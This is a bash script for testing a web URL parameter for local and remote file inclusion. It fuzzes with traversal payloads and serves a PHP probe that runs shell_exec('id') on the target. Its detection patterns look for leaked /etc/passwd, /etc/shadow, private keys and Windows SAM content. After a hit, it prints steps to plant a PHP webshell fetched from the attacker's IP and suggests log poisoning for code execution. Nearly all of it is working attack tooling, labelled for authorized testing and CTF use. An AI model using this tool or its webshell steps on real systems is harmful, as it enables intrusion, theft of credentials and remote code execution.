#!/usr/bin/env bash
# lfi_rfi_tester.sh — Test a URL parameter for LFI and RFI vulnerabilities
#
# !! FOR AUTHORIZED PENETRATION TESTING AND CTF USE ONLY !!
#
# USAGE:
#   ./lfi_rfi_tester.sh -u "http://target/page.php?file=FUZZ" -t lfi
#   ./lfi_rfi_tester.sh -u "http://target/page.php?file=FUZZ" -t rfi
#   ./lfi_rfi_tester.sh -u "http://target/page.php?file=FUZZ"
#
# REQUIREMENTS: curl, python3

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

die()    { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()   { echo -e "${CYAN}[*] $*${RESET}"; }
good()   { echo -e "${GREEN}[+] $*${RESET}"; }
vuln()   { echo -e "${RED}${BOLD}[VULN] $*${RESET}"; }
warn()   { echo -e "${YELLOW}[-] $*${RESET}"; }
detail() { echo -e "${DIM}    $*${RESET}"; }
sep()    { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    echo -e "${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester"
    echo -e ""
    echo -e "  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder"
    echo -e "               e.g. \"http://target/page.php?file=FUZZ\""
    echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ)"
    echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
    echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist (default: auto-resolve LFI-Jhaddix.txt)"
    echo -e "  ${CYAN}-L <ip>${RESET}      Your attack box IP for RFI probe server (default: auto tun0)"
    echo -e "  ${CYAN}-P <port>${RESET}    Port for RFI probe server (default: random free port)"
    echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. \"PHPSESSID=abc123\""
    echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. \"Authorization: Bearer token\""
    echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
    echo -e "  ${CYAN}-d <secs>${RESET}    Delay between requests (default: 0)"
    echo -e "  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability"
    echo -e "  ${CYAN}-v${RESET}           Verbose: show all tested payloads"
    echo -e "  ${CYAN}-h${RESET}           This help"
    echo -e ""
    echo -e "${BOLD}Wordlist resolution order (LFI):${RESET}"
    echo -e "  1. -w <path> if supplied"
    echo -e "  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists"
    echo -e "  3. Cached /tmp/LFI-Jhaddix.txt from a previous run"
    echo -e "  4. Downloaded at runtime from GitHub"
    echo -e ""
    echo -e "${BOLD}Examples:${RESET}"
    echo -e "  $0 -u \"http://10.10.10.5/index.php?page=FUZZ\" -t lfi"
    echo -e "  $0 -u \"http://10.10.10.5/index.php?page=FUZZ\" -t rfi"
    echo -e "  $0 -u \"http://10.10.10.5/index.php?page=FUZZ\" -t rfi -L 10.10.14.5 -P 8888"
    echo -e "  $0 -u \"http://10.10.10.5/index.php?page=FUZZ\""
    exit 0
}

# ── Wordlist resolution ───────────────────────────────────────────────────────
JHADDIX_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt"
JHADDIX_CACHE="/tmp/LFI-Jhaddix.txt"

SECLISTS_CANDIDATES=(
    "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/local/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/homebrew/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
)

resolve_wordlist() {
    local user_path="$1"
    if [[ -n "$user_path" ]]; then
        [[ -f "$user_path" ]] || { echo -e "${RED}[!] Wordlist not found: $user_path${RESET}" >&2; exit 1; }
        echo "$user_path"; return
    fi
    for candidate in "${SECLISTS_CANDIDATES[@]}"; do
        if [[ -f "$candidate" ]]; then
            echo -e "${GREEN}[+] Found SecLists at: $candidate${RESET}" >&2
            echo "$candidate"; return
        fi
    done
    if [[ -f "$JHADDIX_CACHE" ]]; then
        echo -e "${GREEN}[+] Using cached wordlist: $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"; return
    fi
    echo -e "${YELLOW}[-] Downloading LFI-Jhaddix.txt from GitHub...${RESET}" >&2
    if curl -fsSL --max-time 30 -o "$JHADDIX_CACHE" "$JHADDIX_URL" 2>/dev/null; then
        local count; count=$(grep -c . "$JHADDIX_CACHE" 2>/dev/null || echo "?")
        echo -e "${GREEN}[+] Downloaded $count lines → $JHADDIX_CACHE${RESET}" >&2
        echo "$JHADDIX_CACHE"; return
    fi
    echo -e "${RED}[!] Could not download wordlist. Install SecLists or use -w <path>.${RESET}" >&2
    exit 1
}

lfi_payloads() { grep -v '^\s*#' "$1" | grep -v '^\s*$'; }

# ── RFI payloads ──────────────────────────────────────────────────────────────
rfi_payloads() {
    local remote="$1"
    echo "${remote}"
    echo "${remote}%00"
    echo "${remote}?"
    echo "${remote}%3F"
    echo "${remote}%23"
    echo "//${remote#http*://}"
    echo "${remote/http:/https:}"
    echo "http:${remote#*:}"
    echo "${remote}%00.php"
}

# ── RFI probe server ──────────────────────────────────────────────────────────
# Writes a unique token file, starts python3 http.server in background.
# All status output goes to stderr so it doesn't pollute return values.
RFI_PROBE_TOKEN=""; RFI_PROBE_URL=""; RFI_SERVER_PID=""; RFI_SERVE_DIR=""

setup_rfi_server() {
    local lhost="$1" port="$2"

    # Auto-detect attack IP from tun0, then eth0
    if [[ -z "$lhost" ]]; then
        lhost=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        [[ -z "$lhost" ]] && lhost=$(ip addr show eth0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        [[ -z "$lhost" ]] && lhost=$(hostname -I 2>/dev/null | awk '{print $1}')
    fi
    [[ -z "$lhost" ]] && { echo -e "${RED}[!] Cannot detect local IP — use -L <ip>${RESET}" >&2; return 1; }

    # Find a free port if none given
    if [[ -z "$port" ]]; then
        port=$(python3 -c "import socket; s=socket.socket(); s.bind(('',0)); print(s.getsockname()[1]); s.close()" 2>/dev/null || echo "8888")
    fi

    # Unique token for this run
    RFI_PROBE_TOKEN="RFIPROBE$(date +%s)$$"
    RFI_SERVE_DIR=$(mktemp -d /tmp/rfi_serve_XXXXXX)

    # probe.txt — plain token, confirms the server fetched and included our file
    echo "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.txt"

    # probe.php — token + command execution, confirms full RCE is possible
    printf '<?php echo "%s"; echo shell_exec("id"); ?>' \
        "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.php"

    RFI_PROBE_URL="http://${lhost}:${port}"

    # Start HTTP server in background
    ( cd "${RFI_SERVE_DIR}" && python3 -m http.server "${port}" >/dev/null 2>&1 ) &
    RFI_SERVER_PID=$!
    sleep 0.8

    if ! kill -0 "${RFI_SERVER_PID}" 2>/dev/null; then
        echo -e "${RED}[!] HTTP server failed to start on port ${port}${RESET}" >&2
        return 1
    fi

    echo -e "${GREEN}[+] Probe server : ${RFI_PROBE_URL} (PID ${RFI_SERVER_PID})${RESET}" >&2
    echo -e "${GREEN}[+] Probe token  : ${RFI_PROBE_TOKEN}${RESET}" >&2
    echo -e "${GREEN}[+] probe.txt    : plain token (confirms inclusion)${RESET}" >&2
    echo -e "${GREEN}[+] probe.php    : token + id exec (confirms RCE)${RESET}" >&2
    echo -e "${CYAN}[*] Serving from : ${RFI_SERVE_DIR}${RESET}" >&2
    return 0
}

teardown_rfi_server() {
    if [[ -n "${RFI_SERVER_PID:-}" ]]; then
        kill "${RFI_SERVER_PID}" 2>/dev/null || true
        echo -e "${GREEN}[+] RFI probe server stopped${RESET}" >&2
    fi
    [[ -n "${RFI_SERVE_DIR:-}" ]] && rm -rf "${RFI_SERVE_DIR}"
}

# ── Detection: LFI ───────────────────────────────────────────────────────────
# $1 = response body   $2 = baseline body
# Returns: 0 = confirmed, 2 = possible (size anomaly), 1 = no hit
detect_lfi() {
    local body="$1" baseline="${2:-}"

    # ── Linux / Unix ──────────────────────────────────────────────────────────

    if echo "$body" | grep -qE 'root:[x*!]:0:0'; then
        echo "/etc/passwd — root entry found"; return 0
    fi
    if echo "$body" | grep -qE 'daemon:[x*!]:|nobody:[x*!]:'; then
        echo "/etc/passwd — daemon/nobody entry found"; return 0
    fi
    if echo "$body" | grep -qE ':[0-9]{4,}:[0-9]+:[0-9]+:'; then
        echo "/etc/shadow — password hash format detected"; return 0
    fi
    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT=|SCRIPT_FILENAME='; then
        echo "/proc/self/environ — environment variables leaked"; return 0
    fi
    if echo "$body" | grep -qiE '^(Ubuntu|Debian|CentOS|Fedora|Alpine|Kali|Arch|Red Hat|Rocky|Oracle) '; then
        echo "/etc/os-release or /etc/issue content found"; return 0
    fi
    if echo "$body" | grep -qE '"(GET|POST|HEAD|PUT) /.*HTTP/1\.[01]'; then
        echo "Web server log content — log poisoning may be possible"; return 0
    fi
    if echo "$body" | grep -q 'BEGIN.*PRIVATE KEY'; then
        echo "SSH/TLS private key found"; return 0
    fi
    if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
        echo "php://filter base64 source disclosure"; return 0
    fi

    # ── Windows ───────────────────────────────────────────────────────────────

    # win.ini — always present, contains [fonts] section
    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[mci extensions\]|\[files\]'; then
        echo "C:\\windows\\win.ini — INI section header found"; return 0
    fi
    # boot.ini — older Windows (XP/2003)
    if echo "$body" | grep -qiE '\[boot loader\]|\[operating systems\]|multi\(0\)disk\(0\)'; then
        echo "C:\\boot.ini — Windows boot configuration found"; return 0
    fi
    # hosts file
    if echo "$body" | grep -qE '127\.0\.0\.1\s+localhost'; then
        echo "Windows/Linux hosts file content found"; return 0
    fi
    # SAM / SYSTEM hive markers
    if echo "$body" | grep -qiE 'HKLM\\SAM|SAM\\Domains\\Account|\\REGISTRY\\MACHINE'; then
        echo "Windows SAM/registry hive content found"; return 0
    fi
    # IIS config
    if echo "$body" | grep -qiE '<configuration>.*<system\.web>|<httpRuntime|<authentication mode='; then
        echo "IIS web.config content found"; return 0
    fi
    # Windows SYSTEM32 path strings in error messages
    if echo "$body" | grep -qiE 'C:\\Windows\\System32|C:\\inetpub\\wwwroot|C:\\xampp\\'; then
        echo "Windows path disclosed in response"; return 0
    fi
    # PHP config on Windows
    if echo "$body" | grep -qiE 'extension_dir\s*=|WINDIR|SystemRoot|Program Files'; then
        echo "Windows PHP config or environment variables leaked"; return 0
    fi

    # ── CTF / OSCP proof files ────────────────────────────────────────────────
    # local.txt and proof.txt are typically a UUID or 32-char hex string alone on a line
    if echo "$body" | grep -qP '^[a-f0-9]{32}$|^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$'; then
        echo "Proof/flag file content detected (hex hash or UUID)"; return 0
    fi

    # ── Generic content-change detection ─────────────────────────────────────
    if [[ -n "$baseline" ]]; then
        local body_len baseline_len diff abs_diff
        body_len=${#body}
        baseline_len=${#baseline}
        diff=$(( body_len - baseline_len ))
        abs_diff=${diff#-}
        if [[ $abs_diff -gt 100 && $body_len -gt $baseline_len ]]; then
            echo "Response ${diff} bytes larger than baseline — possible file inclusion (verify manually)"
            return 2
        fi
    fi

    return 1
}

# ── Detection: RFI ───────────────────────────────────────────────────────────
# $1 = response body   $2 = probe token written into our served file
# Returns: 0 = confirmed, 2 = possible (PHP error), 1 = no hit
detect_rfi() {
    local body="$1" token="${2:-}"

    # Level 1 — our probe token appeared in the response.
    # The server fetched our file and included its contents in the page.
    if [[ -n "$token" ]] && echo "$body" | grep -qF "$token"; then
        echo "Probe token reflected — server fetched and included our remote file"
        return 0
    fi

    # Level 2 — PHP warning/error proves the parameter reaches include()
    # even though the fetch was blocked (firewall, allow_url_include=Off, etc.)
    if echo "$body" | grep -qiE \
        'failed to open stream|allow_url_include|Connection refused|getaddrinfo failed|No route to host|Warning.*include\(|Warning.*require\(|Fatal error.*include'; then
        echo "PHP warning — parameter reaches include() but remote fetch was blocked"
        return 2
    fi

    return 1
}

# ── HTTP request ──────────────────────────────────────────────────────────────
send_request() {
    local url="$1" cookie="$2" extra_header="$3"
    local args=(-s -L --max-time 10 --max-redirs 2 -A "Mozilla/5.0")
    [[ -n "$cookie" ]]       && args+=(-b "$cookie")
    [[ -n "$extra_header" ]] && args+=(-H "$extra_header")
    curl "${args[@]}" "$url" 2>/dev/null || true
}

# ── URL builder ───────────────────────────────────────────────────────────────
build_url() {
    local base="$1" param="$2" payload="$3"
    if echo "$base" | grep -q 'FUZZ'; then
        echo "${base/FUZZ/$payload}"
    elif [[ -n "$param" ]]; then
        if echo "$base" | grep -qE "[?&]${param}="; then
            echo "$base" | sed "s/\(${param}=\)[^&]*/\1${payload}/"
        elif echo "$base" | grep -q '?'; then
            echo "${base}&${param}=${payload}"
        else
            echo "${base}?${param}=${payload}"
        fi
    else
        die "No FUZZ placeholder in URL and no -p parameter specified."
    fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    local url="" param="" test_type="both" wordlist_path=""
    local lhost="" lport=""
    local cookie="" extra_header="" outfile=""
    local delay=0 stop_first=0 verbose=0

    [[ $# -eq 0 ]] && usage

    while getopts "u:p:t:w:L:P:c:H:o:d:xvh" opt; do
        case "$opt" in
            u) url="$OPTARG" ;;
            p) param="$OPTARG" ;;
            t) test_type="$OPTARG" ;;
            w) wordlist_path="$OPTARG" ;;
            L) lhost="$OPTARG" ;;
            P) lport="$OPTARG" ;;
            c) cookie="$OPTARG" ;;
            H) extra_header="$OPTARG" ;;
            o) outfile="$OPTARG" ;;
            d) delay="$OPTARG" ;;
            x) stop_first=1 ;;
            v) verbose=1 ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    command -v curl   &>/dev/null || die "curl is required"
    command -v python3 &>/dev/null || die "python3 is required (for RFI probe server)"
    [[ -z "$url" ]] && die "Target URL is required (-u). Remember to quote it: -u \"http://...\""
    [[ "$test_type" =~ ^(lfi|rfi|both)$ ]] || die "Invalid type: $test_type (use lfi|rfi|both)"

    # ── Resolve LFI wordlist ──────────────────────────────────────────────────
    local resolved_wordlist=""
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        resolved_wordlist=$(resolve_wordlist "$wordlist_path")
        local payload_count
        payload_count=$(lfi_payloads "$resolved_wordlist" | grep -c . || echo "?")
        info "Wordlist : $resolved_wordlist"
        info "Payloads : $payload_count"
    fi

    # ── Baseline ──────────────────────────────────────────────────────────────
    info "Getting baseline response..."
    local baseline_url baseline baseline_len
    baseline_url=$(build_url "$url" "$param" "BASELINE_NONEXISTENT_12345")
    baseline=$(send_request "$baseline_url" "$cookie" "$extra_header")
    baseline_len=${#baseline}
    info "Baseline : $baseline_len bytes"

    if [[ -n "$outfile" ]]; then
        echo "lfi_rfi_tester results — $(date)" > "$outfile"
        echo "Target: $url" >> "$outfile"
        echo "Wordlist: ${resolved_wordlist:-n/a}" >> "$outfile"
        echo "---" >> "$outfile"
    fi

    local vuln_count=0 tested=0

    # ── LFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting LFI tests..."
        sep

        while IFS= read -r payload; do
            [[ -z "$payload" || "$payload" == \#* ]] && continue

            local target_url response resp_len
            target_url=$(build_url "$url" "$param" "$payload")
            response=$(send_request "$target_url" "$cookie" "$extra_header")
            resp_len=${#response}
            ((tested++))

            local match="" lfi_exit
            match=$(detect_lfi "$response" "$baseline")
            lfi_exit=$?

            if [[ $lfi_exit -eq 0 ]]; then
                vuln "[LFI CONFIRMED] $payload"
                detail "URL    : $target_url"
                detail "Reason : $match"
                detail "Length : $resp_len bytes (baseline: $baseline_len bytes)"
                echo
                [[ -n "$outfile" ]] && echo "[LFI CONFIRMED] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }

            elif [[ $lfi_exit -eq 2 ]]; then
                warn "[LFI POSSIBLE] $payload"
                detail "URL    : $target_url"
                detail "Reason : $match"
                detail "Verify : curl -s \"$target_url\" | head -50"
                echo
                [[ -n "$outfile" ]] && echo "[LFI POSSIBLE] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }

            else
                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
            fi

            [[ "$delay" != "0" ]] && sleep "$delay"
        done < <(lfi_payloads "$resolved_wordlist")
    fi

    # ── RFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting RFI tests..."
        sep
        echo ""

        if ! setup_rfi_server "$lhost" "$lport"; then
            warn "Could not start probe server — skipping RFI tests"
            warn "Ensure python3 is available. Set IP/port manually: -L <ip> -P <port>"
        else
            # Kill server on exit, Ctrl+C, or error
            trap 'teardown_rfi_server' EXIT INT TERM

            warn "RFI requires allow_url_include=On and allow_url_fopen=On in PHP"
            echo ""

            # Test probe.txt first (plain inclusion), then probe.php (inclusion + RCE)
            for probe_file in probe.txt probe.php; do
                local probe_url="${RFI_PROBE_URL}/${probe_file}"
                info "--- Testing: $probe_url ---"

                local probe_hit=0
                while IFS= read -r payload; do
                    [[ -z "$payload" || "$payload" == \#* ]] && continue

                    local target_url response rfi_exit
                    target_url=$(build_url "$url" "$param" "$payload")
                    response=$(send_request "$target_url" "$cookie" "$extra_header")
                    ((tested++))

                    local match=""
                    match=$(detect_rfi "$response" "$RFI_PROBE_TOKEN")
                    rfi_exit=$?

                    [[ "$verbose" -eq 1 ]] && detail "Testing: $payload"

                    if [[ $rfi_exit -eq 0 ]]; then
                        vuln "[RFI CONFIRMED] $payload"
                        detail "Probe  : $probe_file"
                        detail "URL    : $target_url"
                        detail "Reason : $match"
                        if [[ "$probe_file" == "probe.php" ]]; then
                            detail "RCE    : server executed shell_exec('id') — full RCE confirmed"
                        fi
                        echo ""
                        echo -e "${YELLOW}  Next steps:${RESET}"
                        echo -e "${YELLOW}  1. Write a webshell : echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php${RESET}"
                        echo -e "${YELLOW}  2. Serve it         : python3 -m http.server 8000${RESET}"
                        echo -e "${YELLOW}  3. Trigger RCE      : curl 'http://TARGET/page.php?page=http://YOUR_IP:8000/shell.php&c=id'${RESET}"
                        echo ""
                        [[ -n "$outfile" ]] && echo "[RFI CONFIRMED] $target_url | $probe_file | $match" >> "$outfile"
                        ((vuln_count++))
                        probe_hit=1
                        if [[ "$stop_first" -eq 1 ]]; then
                            good "Stopping on first hit (-x)."
                            teardown_rfi_server
                            break 2
                        fi
                        break   # working payload found — move to next probe file

                    elif [[ $rfi_exit -eq 2 ]]; then
                        warn "[RFI POSSIBLE] $payload"
                        detail "Probe  : $probe_file"
                        detail "URL    : $target_url"
                        detail "Reason : $match"
                        echo ""
                        echo -e "${CYAN}  The parameter reaches include() but the fetch was blocked.${RESET}"
                        echo -e "${CYAN}  This could mean:${RESET}"
                        echo -e "${CYAN}    • allow_url_include=Off in php.ini${RESET}"
                        echo -e "${CYAN}    • Outbound firewall blocking the server's HTTP requests${RESET}"
                        echo -e "${CYAN}  Check php.ini: allow_url_include, allow_url_fopen${RESET}"
                        echo ""
                        [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $probe_file | $match" >> "$outfile"
                        ((vuln_count++))
                        probe_hit=1
                        [[ "$stop_first" -eq 1 ]] && { teardown_rfi_server; break 2; }
                        break

                    else
                        [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
                    fi

                    [[ "$delay" != "0" ]] && sleep "$delay"
                done < <(rfi_payloads "$probe_url")

                [[ "$probe_hit" -eq 1 ]] && break
            done

            teardown_rfi_server
            trap - EXIT INT TERM
        fi
    fi

    # ── Summary ───────────────────────────────────────────────────────────────
    sep
    echo -e "${BOLD}Results: $vuln_count finding(s) from $tested requests.${RESET}"
    [[ -n "$outfile" ]] && good "Output saved to: $outfile"

    if [[ "$vuln_count" -gt 0 ]]; then
        echo ""
        warn "LFI next steps:"
        warn "  • php://filter to read PHP source files"
        warn "  • Log poisoning: inject PHP into User-Agent, then include log"
        warn "  • /proc/self/environ for code execution via User-Agent"
        warn "  • /etc/shadow if readable"
        warn "  • Windows: C:\\windows\\win.ini, web.config, php.ini"
        warn "RFI next steps:"
        warn "  • Host a PHP webshell and include it via the parameter"
        warn "  • Requires allow_url_include=On and allow_url_fopen=On"
    fi
}

main "$@"
